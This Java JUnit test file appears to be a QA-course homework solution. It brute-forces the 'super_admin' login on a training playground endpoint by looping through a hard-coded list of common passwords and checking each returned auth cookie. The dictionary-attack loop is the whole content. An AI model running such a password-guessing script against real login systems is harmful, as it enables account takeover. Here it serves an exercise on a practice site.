import io.restassured.RestAssured;
import java.util.Arrays;

import io.restassured.path.json.JsonPath;
import io.restassured.response.Response;
import org.junit.jupiter.api.Test;

import java.util.HashMap;
import java.util.Map;

public class Homework9 {
    @Test
        public void Password(){
        String login = "super_admin";
        String[] password = {"123456", "1234567", "12345678", "password", "qwerty", "abc123", "12345", "111111", "123123", "monkey", "dragon", "123456789", "football", "letmein", "iloveyou", "welcome", "master", "sunshine", "trustno1", "princess", "admin", "password1", "1234", "baseball", "passw0rd", "shadow", "654321", "1234567890", "login", "michael", "qwerty123", "solo", "qwertyuiop", "ashley", "mustang", "starwars", "superman", "qazwsx", "121212", "555555", "666666", "696969", "888888", "7777777", "adobe123", "1q2w3e4r", "photoshop", "1qaz2wsx", "bailey", "access", "flower", "lovely", "!@#$%^&*", "jesus", "hello", "charlie", "hottie", "freedom", "aa123456", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1", "Football", "000000", "123qwe"};
        for (int i = 0; i < password.length; i++){



        Map<String, String> params = new HashMap<>();
        params.put("login", login);
        params.put("password",password[i]);
        Response response = RestAssured
                .given()
                .queryParams(params)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
                .andReturn();
        String cookie = response.getCookie("auth_cookie");

        Response last = RestAssured
                .given()
                .cookie("auth_cookie",cookie)
                .when()
                .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
                .andReturn();
        String laststring = last.getBody().asString();
        if (laststring.equals("You are authorized")){
            System.out.println(password[i]);
            System.out.println("You are authorized");
        }
        }
    }
}
